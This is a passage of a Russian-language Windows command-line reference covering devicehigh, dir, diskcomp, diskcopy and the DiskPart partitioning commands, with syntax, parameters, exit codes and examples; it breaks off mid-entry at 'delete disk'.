Перед загрузкой драйверов устройств в верхнюю память с помощью команды device необходимо загрузить драйвер Himem.sys. Это нужно сделать перед использованием какой-либо команды devicehigh в файле Config.nt или эквивалентном загрузочном файле.
- Ограничение размера

Если указанный драйвер устройства попытается выделить блок верхней памяти, превышающий доступный размер, система может зависнуть. Чтобы избежать этого, используйте параметр размер. Параметр размер указывает количество памяти (в шестнадцатеричном формате), необходимое для данного драйвера. Чтобы узнать данную величину для определенного драйвера устройства, загрузите этот драйвер в обычную память и запустите команду mem /debug.
- Загрузка в обычную память

Если нет достаточного объема верхней памяти для загрузки драйвера устройства с помощью команды devicehigh, подсистема MS-DOS загрузит драйвер в обычную память (как при вызове команды device).
Примеры

Чтобы загрузить драйвер устройства Mydriv.sys в верхнюю область памяти, введите следующую команду в файле Config.nt или эквивалентном загрузочном файле:

device=c:\winnt\system32\himem.sys
dos=umb
devicehigh=mydriv.sys
========================================================================================
Dir

Вывод списка файлов и подкаталогов каталога. Вызванная без параметров команда dir выводит метку тома и серийный номер, за которыми следует список каталогов и файлов на диске, включая их имена, дату и время последнего изменения. Для файлов dir выводит также расширение имени и размер в байтах. Команда dir также выводит общее число перечисленных файлов и каталогов, их общий размер и свободное пространство (в байтах) на диске.
Синтаксис

dir [диск:][путь][имя_файла] [...] [/p] [/q] [/w] [/d] [/a[[:]атрибуты]][/o[[:]порядок_сортировки]] [/t[[:]поле_сортировки]] [/s] [/b] [/l] [/n] [/x] [/c] [/4]
Параметры

[диск:][путь]
    Задание диска и каталога, список файлов которого будет выведен.
[имя_файла]
    Задание файла или группы файлов, сведения о которых требуется вывести.
/p
    Постраничный вывод сведений, т. е. с паузой после заполнения экрана. Для продолжения просмотра необходимо нажать любую клавишу.
/q
    Вывод сведений о владельце файла.
/w
    Вывод сведений в несколько колонок до пяти имен файлов или каталогов в каждой строке.
/d
    Соответствует /w, но с сортировкой по столбцам.
/a [[:] атрибуты]
    Выводит имена только тех файлов и каталогов, которые имеют указанные атрибуты. Если параметр /a не указан, команда dir выводит имена всех файлов, за исключением системных и скрытых. Если параметр /a указан без атрибутов, команда dir выводит имена всех файлов, включая скрытые и системные. Ниже приведен список значений, которые могут быть использованы при задании параметра атрибуты. Двоеточие (:) является необязательным. Значения из таблицы могут использоваться в любых комбинациях без пробела между ними.
Значение     Описание
h     Скрытые файлы
s     Системные файлы
d     Каталоги
a     Файлы, готовые к архивированию
r     Файлы, доступные только для чтения
-h     Файлы, не являющиеся скрытыми
-s     Файлы, не являющиеся системными
-d     Только файлы (не каталоги)
-a     Файлы, не изменявшиеся после последнего архивирования
-r     Файлы, не имеющие атрибута «Только чтение»
/o [[:]порядок_сортировки]
    Управление порядком сортировки и вывода имен файлов и каталогов командой dir. Если параметр /o, не задан, команда dir выводит имена в том порядке, в котором они записаны в каталоге. Если параметр /o использован без параметра порядок_сортировки, команда dir выводит имена каталогов в алфавитном порядке, затем — имена файлов в алфавитном порядке. Двоеточие (:) является необязательным. Ниже приведен список значений, которые могут быть использованы при задании параметра порядок_сортировки. Допускается использование любого их сочетания без пробелов между ними.
Значение     Описание
n     Сортировка по именам в алфавитном порядке
e     Сортировка по расширениям в алфавитном порядке
d     Сортировка по дате и времени от ранних к поздним
s     Сортировка по размеру от меньших к большим
g     Сортировка с группированием каталогов перед файлами
-n     Сортировка по именам в обратном алфавитном порядке (от Z к A)
-e     Сортировка по расширению в обратном алфавитном порядке (от .ZZZ к .AAA)
-d     Сортировка по дате и времени от поздних к ранним
-s     Сортировка по размеру от больших к меньшим
-g     Сортировка с группировкой каталогов после файлов
/t [[:]поле_времени]
    Задание поля времени для вывода и сортировки. Ниже приведен список значений, которые могут быть использованы при задании параметра поле_времени.
Значение     Описание
c     Создание
a     Последнее обращение
w     Последняя запись
/s
    Перечисление всех случаев обнаружения определенного имени файла в указанном каталоге и всех его подкаталогах.
/b
    Перечисление каждого имени файла (включая расширение) или каталога на отдельной строке. При использовании параметра /b заголовочные сведения или сводка не выводятся. Параметр /b отменяет параметр /w. 
/l
    Вывод несортированного списка имен каталогов и имен файлов строчными буквами. Параметр /l не позволяет преобразовывать дополнительные символы в строчные. 
/n
    Вывод списка в расширенном формате с именами файлов в правой части экрана.
/x
    Вывод сокращенных имен файлов файловых систем NTFS и FAT. Формат совпадает с форматом параметра /n, но сокращенные имена выводятся после полных.
/c
    Вывод разделителя десятичных разрядов в размере файлов.
/4
    Отображение года в четырехзначном формате.
/?
    Отображение справки в командной строке.

Примечания
- Использование нескольких имен_файлов

Допускается использование нескольких имен_файлов. Разделяйте имена файлов пробелом, запятой или точкой с запятой. Для вывода группы файлов допускается применение подстановочных знаков (? и *) в параметре имя_файла.
- Использование подстановочных знаков

Для вывода списка подгруппы файлов и подкаталогов можно использовать подстановочные знаки (? и *).
- Задание атрибутов файлов для вывода

Если параметр /a используется более чем с одним значением параметра атрибуты, команда dir выведет имена только тех файлов, все атрибуты которых совпадают с заданными. Например, при использовании параметра /a со значениями атрибутов r и -h в формате /a:r-h или /ar-h команда dir выведет имена файлов, являющихся одновременно скрытыми и защищенными от записи.
- Указание порядка сортировки имен файлов

Если указано несколько значений порядка_сортировки, команда dir сортирует имена файлов сначала по первому условию, затем — по второму и т. д. Например, если указан ключ /o со значениями e и -s порядка_сортировки в формате /o:e-s или /oe-s, команда dir отсортирует имена каталогов и файлов по расширениям, затем от больших файлов к меньшим и выведет окончательный результат. В результате сортировки по алфавиту файлы без расширений будут идти вначале, затем имена каталогов, а потом имена файлов с расширениями.
- Использование перенаправления и каналов

Чтобы перенаправить вывод команды dir в файл с помощью символа (>) или использовать канал (|) для передачи вывода в другую команду, необходимо использовать параметры команды dir /a:-d и /b для вывода только списка имен файлов. Параметр имя_файла с параметрами /b и /s можно использовать, чтобы указать поиск командой dir в текущем каталоге и его подкаталогах всех файлов, соответствующих значению имя_файла. При этом команда dir выведет только имя диска, имя каталога, имя файла и расширение по одному файлу в строке. Чтобы использовать перенаправление с помощью каналов, в файле Autoexec.nt должна быть установлена переменная среды TEMP.
- Предварительное задание параметров команды dir

Параметры команды dir могут быть предварительно заданы включением команды set для переменной среды DIRCMD в файл Autoexec.nt. В команде set dircmd может быть использована любая допустимая комбинация параметров команды dir, включая расположение и имя файла.

Например, чтобы использовать переменную среды DIRCMD для задания вывода в расширенном формате (/w) по умолчанию, в файле Autoexec.nt необходимо ввести следующую строку:

set dircmd=/w

При однократном использовании команды dir можно отменить параметр с помощью переменной среды DIRCMD. Для этого введите параметр, который требуется отменить, в командной строке dir, указав перед ним знак минус. Например:

dir /-w

Чтобы изменить параметры DIRCMD, используемые по умолчанию, введите следующую команду:

set=новый_параметр

Новые параметры по умолчанию останутся в силе для всех последующих команд dir, пока команда set dircmd не задаст новые параметры или не будет перезагружен компьютер.

Чтобы удалить все параметры по умолчанию, введите следующую команду:

set dircmd=

Чтобы просмотреть текущие параметры переменной среды DIRCMD, введите следующую команду:

set

Команда set выведет список переменных среды и их параметров. Дополнительные сведения о параметрах переменных среды см. по по ссылке «».
- Команда dir с другими параметрами доступна в консоли восстановления.
Примеры

Чтобы вывести подряд все каталоги в алфавитном порядке, в несколько колонок и с паузой после заполнения каждого экрана, убедитесь, что корневой каталог является текущим, и введите следующую команду:

dir /s/w/o/p

Команда dir выводит имя корневого каталога, имена его подкаталогов и имена файлов (включая расширения) в этом каталоге. Затем выводятся имена подкаталогов и имена файлов в каждом каталоге дерева каталогов.

Для изменения предыдущего примера так, чтобы команда dir не выводила имена каталогов, введите следующую команду:

dir /s/w/o/p/a:-d

Чтобы напечатать список каталогов, введите следующую команду:

ir > prn

Если указать параметр prn, список каталогов отправляется на принтер, подключенный к порту LPT1. Если принтер подключен к другому порту, необходимо заменить параметр prn именем этого порта.

Вывод команды dir также может быть направлен в файл при замене prn на имя файла. Кроме того, можно также ввести путь. Например, для направления вывода команды dir в файл Dir.doc в каталоге Records введите следующую команду:

dir > \records\dir.doc

Если файл Dir.doc не существует, команда dir создаст его при условии наличия каталога Records. Если этот каталог не существует, выводится следующее сообщение:

Ошибка создания файла

Чтобы вывести список всех файлов с расширением .txt во всех каталогах диска C, введите следующую команду:

dir c:\*.txt /w/o/s/p

Команда dir выводит на экран алфавитный список файлов, удовлетворяющих заданному шаблону, в несколько колонок с паузой после заполнения каждого экрана.
========================================================================================
Diskcomp

Сравнение содержимого двух гибких дисков. При запуске команды diskcomp без параметров для сравнения дисков используется текущий дисковод.
Синтаксис

diskcomp [диск1: [диск2:]]
Параметры

диск1
    Задание дисковода, содержащего первый гибкий диск.
диск2
    Задание дисковода, содержащего второй гибкий диск.
/?
    Отображение справки в командной строке.

Примечания
- Использование дисков

Команда diskcomp работает только с гибкими дисками. Команду diskcomp нельзя использовать для жестких дисков. Если жесткий диск задан в качестве параметра диск1 или диск2, diskcomp выведет на экран следующее сообщение:

Диск задан неправильно.
Указанный диск не существует
либо является несъемным
- Сравнение дисков

Если все дорожки на сравниваемых дисках совпадают, команда diskcomp выводит следующее сообщение:

Различия не найдены.

Если обнаружены несовпадающие дорожки, команда diskcomp выведет на экран следующее сообщение:

Ошибка сравнения:
сторона 1, дорожка 2

После окончания сравнения команда diskcomp выведет следующее сообщение:

Сравнить еще диск [Y(да)/N(нет)]?

При нажатии клавиши Y программа diskcomp выведет приглашение вставить следующий гибкий диск в дисковод для повторения операции. При нажатии клавиши N работа команды diskcomp завершается.

В процессе сравнения не учитываются номера томов гибких дисков командой diskcomp.
- Пропуск параметров

Если опущен параметр диск2, команда diskcomp использует текущий диск в качестве параметра диск2. Если не заданы оба параметра, diskcomp использует текущий дисковод для обоих дисков. Если текущий диск совпадает с параметром диск1, команда diskcomp выведет приглашение сменить диски по мере необходимости.
- Использование одного дисковода

Если один и тот же диск задан в качестве параметров диск1 и диск2, команда diskcomp будет работать с использованием одного дисковода и запрашивать смену дисков, когда потребуется. Возможно, менять диски местами придется несколько раз, в зависимости от емкости дисковода и объема доступной памяти.
- Сравнение дисков разного типа

С помощью команды diskcomp невозможно сравнивать односторонние диски с двухсторонними, также как и диски двойной плотности с дисками высокой плотности. Если типы дисков диск1 и диск2 отличаются друг от друга, команда diskcomp выведет на экран следующее сообщение:

Несовместимые форматы дисководов или дисков.
- Использование diskcomp для сравнения сетевых и виртуальных дисков

Команда diskcomp не работает с сетевыми устройствами и дисками, созданными командой subst. При попытке использовать diskcomp с устройством любого из этих типов программа diskcomp выведет следующее сообщение об ошибке:

Неправильно указан диск.
- Сравнение дисков при копировании

Если команда diskcomp используется для сравнения диска, созданного с помощью программы copy, diskcomp может выводить сообщение, аналогичное следующему:

Ошибка сравнения:
сторона 0, дорожка 0

Это сообщение может возникать даже в том случае, если файлы на дисках полностью совпадают. Это связано с тем, что хотя команды copy и дублирует сведения, она не обязательно помещает их в то же место, что и на диске-оригинале. Дополнительные сведения о сравнении файлов на дисках с помощью команды Fc см. по ссылке «».
- Общее представление о кодах завершения команды diskcomp

В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Диски одинаковы
1     Найдены различия
3     Возникла невосстановимая ошибка
4     Возникла ошибка инициализации

Для обработки кодов завершения, возвращаемых diskcomp можно воспользоваться параметром уровень_ошибки команды if в пакетном файле.
Примеры

Если в системе установлен только один дисковод гибких дисков (например A) и требуется сравнить два диска, введите следующую команду:

diskcomp a: a:

Программа diskcomp выводит приглашения вставить диски по мере необходимости.

Следующий пример демонстрирует использование параметра errorlevel в строке команды if для обработки кодов завершения программы diskcomp в пакетном файле:

rem Checkout.bat сравнивает два диска в дисководах A и B
echo off
diskcomp a: b:
if errorlevel 4 goto ini_error
if errorlevel 3 goto hard_error
if errorlevel 1 goto no_compare
if errorlevel 0 goto compare_ok
:ini_error
echo ОШИБКА: недостаточно памяти или неверная команда
goto exit
:hard_error
echo ОШИБКА: возникла невосстановимая ошибка
goto exit
:break
echo "Нажата комбинация клавиш CTRL+C" для остановки сравнения
goto exit
:no_compare
echo Диски отличаются
goto exit
:compare_ok
echo Сравнение прошло успешно, диски совпадают
goto exit
:exit
========================================================================================
Diskcopy

Копирование содержимого гибкого диска на другой форматированный или неформатированный гибкий диск. При запуске команды diskcopy без параметров для исходного и конечного дисков используется текущий дисковод.
Синтаксис

diskcopy [диск1: [диск2:]] [/v]
Параметры

диск1
    Задание дисковода, содержащего диск-источник.
диск2
    Задание дисковода, содержащего конечный диск.
/v
    Проверка правильности копирования сведений. Этот параметр командной строки замедляет процесс копирования.
/?
    Отображение справки в командной строке.

Примечания
- Использование дисков

Команда diskcopy работает только со съемными дисками, такими как гибкие диски. Команда diskcopy не может быть использована с жесткими дисками. Если жесткий диск задан в качестве параметра диск1 или диск2, diskcopy выведет на экран следующее сообщение:

Диск задан неправильно.
Указанный диск не существует
либо является несъемным

Команда diskcopy выведет приглашение вставить в дисководы исходный и конечный диски и нажать любую клавишу для продолжения.

После завершения копирования diskcopy выведет на экран следующее сообщение:

Копировать еще диск [Y(да)/N(нет)]?

При нажатии клавиши Y команда diskcopy выведет приглашение вставить исходный и конечные диски для следующей операции копирования. Для окончания работы команды diskcopy следует нажать N.

Если diskcopy копирует на неформатированный диск в дисководе, заданном параметром диск2, этот диск будет отформатирован так же, как диск1, с тем же количеством сторон и плотностью. При этом diskcopy выведет на экран сообщение:

Форматирование в процессе копирования.
- Серийные номера дисков

Если диск-источник имеет серийный номер тома, программа diskcopy создаст новую серийную метку тома на диске-результате после завершения процесса копирования.
- Пропуск параметров

Если опущен параметр диск2, команда diskcopy будет использовать текущий диск. Если не заданы оба параметра, diskcopy использует текущий дисковод для обоих дисков. Если текущий диск совпадает с параметром диск1, команда diskcopy будет запрашивать смену дисков по мере необходимости.
- Использование одного дисковода для копирования

Если параметры диск1 и диск2 совпадают, программа diskcopy выведет приглашение поменять диски. Если не заданы оба параметра диск и текущий диск является дисководом гибкого диска, программа diskcopy будет запрашивать подтверждения каждый раз, когда будет требоваться смена диска. Если на диске содержится больше информации, чем объем доступной памяти, команда diskcopy не сможет выполнить копирование за один проход. Команда diskcopy читает исходный диск, записывает сведения на диск-результат, а затем снова приглашает сменить диск. Этот процесс будет продолжаться до тех пор, пока вся информация не будет скопирована.
- Снижение степени фрагментации дисков

Поскольку команда diskcopy создает точную копию одного диска на другом, если файлы на диске-источнике были фрагментированы, то же самое будет и на диске-результате. Фрагментацией называется наличие маленьких участков свободного дискового пространства между файлами на диске.

Фрагментированный диск может вызвать замедление операций поиска, чтения и записи файлов. Чтобы избежать переноса фрагментации с одного диска на другой, рекомендуется использовать команды copy или xcopy для копирования дисков. Так как copy и xcopy выполняют последовательное копирование файлов, новый диск не будет иметь фрагментации.

Осторожно!
- Команда xcopy не может быть использована для копирования загрузочных дисков. - Общее представление о кодах завершения команды diskcopy

В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Операция копирования прошла успешно
1     Возникла нефатальная ошибка чтения/записи
3     Возникла невосстановимая ошибка
4     Возникла ошибка инициализации

Для обработки кодов завершения, возвращаемых diskcomp, можно воспользоваться параметром errorlevel команды if в пакетном файле. Пример пакетной программы, обрабатывающей коды завершения, см. команду diskcomp по ссылке «».
Примеры

Чтобы скопировать диск в дисководе B на диск в дисководе A, введите следующую программу:

diskcopy b: a:
========================================================================================
DiskPart

Программа DiskPart.exe — это работающий в текстовом режиме командный интерпретатор, который позволяет управлять объектами (дисками, разделами или томами) с помощью сценариев или команд, вводимых с командной строки. Перед использованием команд DiskPart.exe для диска, раздела или тома, необходимо сначала составить список объектов, а затем выбрать объект для работы. После этого все введенные команды DiskPart.exe выполняются для данного объекта.

Составить список всех доступных объектов и определить номер объекта или букву диска можно с помощью команд list disk, list volume и list partition. Команды list disk и list volume позволяют вывести все диски и тома компьютера. Команда list partition, однако, выводит разделы только выбранного диска. При использовании команды list рядом с выбранным объектом отображается звездочка (*). Объект выбирается по номеру или букве диска, например диск 0, раздел 1, том 3 или том C.

После выбора объекта он остается выделенным до выбора другого объекта. Например, если фокус установлен на диске 0 и выбран том 8 на диске 2, фокус переместиться с диска 0 на том 8 диска 2. В некоторых командах фокус перемещается автоматически. Например, после создания раздела фокус автоматически перемещается на этот раздел.

Только на выбранном диске можно переместить фокус на раздел. Если фокус установлен на разделе, соответствующий том (если таковой имеется) также получает фокус. Если том имеет фокус, соответствующие диск и раздел также получают фокус при условии, что этот том связан с одним определенным разделом. В противном случае диск и раздел не выделяются.
Команды DiskPart

Чтобы ознакомиться с синтаксисом команды, щелкните ссылку.

active

Пометка имеющего фокус раздела на базовом диске как активного. Эта информация указывает базовой системе ввода/вывода (BIOS) или расширенному интерфейсу микропрограмм, что раздел или том является действительным системным разделом или системным томом.

Только разделы могут быть помечены как активные.

Важно!
- DiskPart проверяет только тот факт, что раздел может содержать файлы загрузки операционной системы. DiskPart не проверяет содержимое раздела. Если раздел, помеченный по ошибке как «active», не содержит файлы загрузки операционной системы, компьютер не запустится.
Синтаксис

active

add disk

Отражение простого тома с фокусом на указанный диск.
Синтаксис

add disk=n [noerr]
Параметры

n
    Задание диска, на котором будет создано зеркало. Допускается создавать зеркала только простых томов. Необходимо, чтобы на указанном диске имелось незанятое место, размер которого не меньше размера простого тома, который требуется отразить.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

assign

Назначение буквы диска или точки подключения тому, имеющему фокус. Если буква диска или точка подключения не указана, используется следующая доступная буква. Если буква диска или точка подключения уже используется, возникает ошибка.

Команду assign можно использовать для смены буквы диска, связанной со съемным диском.

Нельзя назначать буквы дисков системным томам, загрузочным томам или томам, содержащим файл подкачки. Кроме того, буква диска не может быть назначена разделу ИВТ или разделу GPT, отличному от раздела MSDATA.
Синтаксис

assign [{letter=d|mount=путь}] [noerr]
Параметры

letter=d
    Буква диска, которую требуется назначить тому.
mount=путь
    Путь к точке подключения, который требуется назначить тому.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

break disk

Применяется только к динамическим дискам. Разбивает зеркальный том, имеющий фокус, на два простых тома. Один простой диск сохраняет букву диска и все точки подключения зеркального тома, а на другой перемещается фокус, таким образом для него можно назначить букву диска.

По умолчанию содержимое обоих половин зеркала сохраняется. Каждая половина становится простым томом. Если задан параметр nokeep, только одна половина зеркала сохраняется как простой том, а другая половина удаляется и преобразуется в свободное пространство. Ни один из томов не получает фокус.
Синтаксис

break disk=n [nokeep] [noerr]
Параметры

n
    Задание диска, на котором будет создан отраженный том.
nokeep
    Задание сохранения только одного из отраженных томов. Второй простой том удаляется и преобразуется в свободное пространство. Ни том, ни свободное пространство не получают фокус.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

clean

Удаление всех разделов или томов на диске, имеющем фокус. На дисках основной загрузочной записи (MBR) перезаписываются только сведения о разделах диска MBR и скрытых секторах. На дисках таблицы разделов GUID (GPT) перезаписываются сведения о разделах GPT, включая защитную основную загрузочную запись (MBR). Сведения о скрытых секторах отсутствуют.
Синтаксис

clean [all]
Параметр

all
    Задание обнуления всех секторов на диске, в результате чего полностью удаляются все данные, содержащиеся на диске.

convert basic

Преобразование пустого динамического диска в базовый.
Синтаксис

convert basic [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

convert dynamic

Преобразование базового диска в динамический.
Синтаксис

convert dynamic [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

convert gpt

На компьютерах с процессором Itanium преобразует пустой базовый диск со стилем разделов основная загрузочная запись в базовый диск со стилем разделов таблица разделов GUID.

Важно!
- Диск может быть преобразован в GPT-диск, только если он пуст. Перед преобразованием диска создайте архивную копию данных, а затем удалите все разделы и тома.
Синтаксис

convert gpt [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

convert mbr

На компьютерах с процессором Itanium преобразует пустой базовый диск со стилем разделов таблица разделов GUID в базовый диск со стилем разделов основная загрузочная запись.

Важно!
- Диск может быть преобразован в MBR-диск, только если он пуст. Перед преобразованием диска создайте архивную копию данных, а затем удалите все разделы и тома.
Синтаксис

convert mbr [noerr]
Параметр

noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create partition efi

Создание системного раздела EFI (Extensible Firmware Interface) на диске с таблицей разделов GUID (GPT) на компьютерах с процессорами Itanium. После создания раздела фокус перемещается на этот раздел.
Синтаксис

create partition efi [size=n] [offset=n] [noerr]
Параметры

size=n
    Размер раздела в мегабайтах (Мбайт). Если размер не указан, раздел занимает все свободное пространство в текущей области.
offset=n
    Смещение в байтах для начала нового раздела. Если смещение не указано, раздел помещается в первый диск, имеющий достаточный размер.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create partition extended

Создание дополнительного раздела на текущем диске. После создания раздела фокус автоматически переносится на этот раздел. На диске можно создать только один дополнительный раздел. Команда не выполняется при попытке создать дополнительный раздел в другом дополнительном разделе. Дополнительный раздел следует создавать до создания логических дисков.
Синтаксис

create partition extended [size=n] [offset=n] [noerr]
Параметры

size=n
    Размер дополнительного раздела в мегабайтах (Мбайт). Если размер не указан, раздел занимает все свободное пространство области. Размер определяется цилиндрами. Размер округляется до ближайшей границы цилиндра. Например, если задан размер 500 Мбайт, то размер раздела округляется до 504 Мбайт.
offset=n
    Применяется только к дискам, содержащим основную загрузочную запись (MBR). Смещение в байтах для начала дополнительного раздела. Если смещение не указано, раздел начинается с начала свободного пространства на диске. Смещение зависит от цилиндров. Смещение округляется до ближайшей границы цилиндра. Например, если указано смещение 27 Мбайт, а размер цилиндра 8 Мбайт, смещение округляется до границы 24 Мбайт.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create partition logical

Создание логического диска в дополнительном разделе. После создания раздела фокус автоматически переносится на новый логический диск.
Синтаксис

create partition logical [size=n] [offset=n] [noerr]
Параметры

size=n
    Размер логического диска в мегабайтах (Мбайт). Если размер не указан, раздел занимает все свободное пространство в текущей области.
offset=n
    Применяется только к дискам, содержащим основную загрузочную запись (MBR). Смещение в байтах для начала нового логического диска. Смещение зависит от цилиндров (т. е. смещение округляется до размера определенного цилиндра). Если смещение не указано, раздел помещается в первое пространство на диске, достаточно большое, чтобы уместить его. Размер раздела в байтах должен быть не меньше числа, указанного в параметре size=n. Если указывается размер логического диска, то он должен быть меньше, чем дополнительный раздел.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create partition msr

Создание системного раздела EFI (Extensible Firmware Interface) на диске, содержащем таблицу разделов GUID (GPT), в компьютерах с процессорами Itanium.

Внимание!
- Будьте внимательны при использовании команды create partition msr. Поскольку для дисков GPT используется специальная разметка раздела, создание разделов MSR может привести к тому, что диск станет нечитаемым. На дисках GPT, используемых для запуска системы Windows XP 64-Bit Edition, первым разделом является системный раздел EFI, за которым следует раздел MSR. На дисках, используемых только для хранения данных, системный раздел EFI System отсутствует, а первым разделом является раздел MSR.

В системе Windows XP 64-Bit Edition подключение разделов MSR не выполняется. Удалять такие разделы, а также сохранять данные в них нельзя.
Синтаксис

create partition msr [size=n] [offset=n] [noerr]
Параметры

size=n
    Размер раздела в мегабайтах (Мбайт). Длина раздела в байтах должна быть не менее числа, указанного в параметре size=n. Если размер не указан, раздел занимает все невыделенное пространство в текущей области.
offset=n
    Смещение в байтах для начала нового раздела. Раздел начинается со смещения в байтах, заданного параметром offset=n. Смещение зависит от цилиндров (т. е. смещение округляется до размера определенного цилиндра). Если не указано смещение, раздел помещается в первое пространство на диске, достаточно большое, чтобы уместить его.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create partition primary

Создание основного раздела на текущем базовом диске. После создания раздела фокус автоматически переносится на этот раздел. При этом дополнительный раздел не получает букву диска. Для назначения буквы диска данному разделу воспользуйтесь командой assign.
Синтаксис

create partition primary [size=n] [offset=n] [ID={byte|GUID}] [noerr]
Параметры

size=n
    Размер раздела в мегабайтах (Мбайт). Если размер не указан, раздел занимает все невыделенное пространство в текущей области. Размер определяется цилиндрами. Размер округляется до ближайшей границы цилиндра. Например, если задан размер 500 Мбайт, то размер раздела округляется до 504 Мбайт.
offset=n
    Смещение в байтах для начала нового раздела. Если смещение не указано, раздел начинается с начала свободного пространства на диске. Для дисков с основной загрузочной записью (MBR) значение смещения зависит от цилиндров. Смещение округляется до ближайшей границы цилиндра. Например, если указано смещение 27 Мбайт, а размер цилиндра 8 Мбайт, смещение округляется до границы 24 Мбайт.
ID={byte|GUID}
    Этот параметр предназначен только для использования ИВТ.

    Внимание!
    - Создание разделов с этим параметром может привести к сбоям в работе компьютера или невозможности его загрузки. Использовать параметр ID=byte | GUID при создании GPT-дисков рекомендуется только ИВТ и специалистам в области информационных технологий, имеющим опыт работы с GPT-дисками. Используйте команду create partition efi для создания системных разделов EFI, команду create partition msr для создания разделов MSR и команду create partition primary (без параметра ID=byte | GUID) для создания основных разделов на GPT-дисках.

    Для MBR-дисков можно задавать байт типа раздела в шестнадцатеричном формате. Если байт типа раздела на MBR-диске не задан, команда create partition primary создает раздел с типом 0x6. Любой байт типа раздела может быть задан с помощью параметра ID=byte | GUID. Команда DiskPart не выполняет проверку допустимости байта типа раздела, а также каких-либо других проверок параметра ID.
    Для GPT-дисков можно задать тип GUID создаваемого раздела. - Системный раздел EFI: c12a7328-f81f-11d2-ba4b-00a0c93ec93b- Раздел MSR: e3c9e316-0b5c-4db8-817d-f92df00215ae- Раздел MSDATA: ebd0a0a2-b9e5-4433-87c0-68b6b72699c7- Раздел метаданных диспетчера локальных дисков на динамическом диске: 5808c8aa-7e8f-42e0-85d2-e1e90434cfb3- Раздел данных диспетчера локальных дисков на динамическом диске: af9b60a0-1431-4f62-bc68-3311714a69ad

    Если тип GUID разделов задан, команда create partition primary создает раздел MSDATA. Любой тип раздела может быть задан с помощью параметра ID={byte | GUID}. Команда DiskPart не выполняет проверку допустимости GUID раздела, а также каких-либо других проверок параметра ID.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create volume raid

Создание тома RAID-5 на указанных динамических дисках. После создания тома фокус автоматически перемещается на этот том.
Синтаксис

create volume raid [size=n] [disk=n[,[n,…]] [noerr]
Параметры

size=n
    Размер дискового пространства в мегабайтах (Мбайт), который том будет занимать на каждом диске. Если размер не указан, создается том RAID-5 максимального возможного размера. Размер тома RAID-5 определяется диском с наименьшим размером непрерывного свободного места. Объем того же размера выделяется на каждом диске. Фактический объем доступного дискового пространства на томе RAID-5 меньше суммы всего занятого дискового пространства, поскольку некоторая его часть требуется для четности.
disk=n
    Динамические диски, на которых создается том. Объем, равный значению size=n, выделяется на каждом диске.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create volume simple

Создание простого тома. После создания тома фокус автоматически переносится на этот том.
Синтаксис

create volume simple [size=n] [disk=n] [noerr]
Параметры

size=n
    Размер раздела в мегабайтах (Мбайт). Если размер не задан, новый том занимает все свободное место на диске.
disk=n
    Динамический диск, на котором создается том. Если диск не задан, используется текущий диск.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

create volume stripe

Создание чередующегося тома на указанных дисках. После создания тома фокус автоматически переносится на этот том.
Синтаксис

create volume stripe [size=n] [disk=n[,[n,…]] [noerr]
Параметры

size=n
    Объем дискового пространства в мегабайтах (Мбайт), который том будет занимать на каждом диске. Если размер не задан, новый том занимает все свободное пространство на самом маленьком диске и равный объем на каждом последующем диске.
disk=n
    Динамические диски, на которых создается том. На каждом диске выделяется объем, равный значению size=n.
noerr
    Только для сценариев. Если задан этот параметр, при возникновении ошибки программа DiskPart продолжает обрабатывать команды, как если бы ошибки не было. Если параметр noerr не задан, при возникновении ошибки работа программы DiskPart завершается и выдается код ошибки.

delete disk

Удаление отсутствующего динамического диска из списка дисков.
Синтаксис

delete disk [noerr] [override]
Параметры

noerr
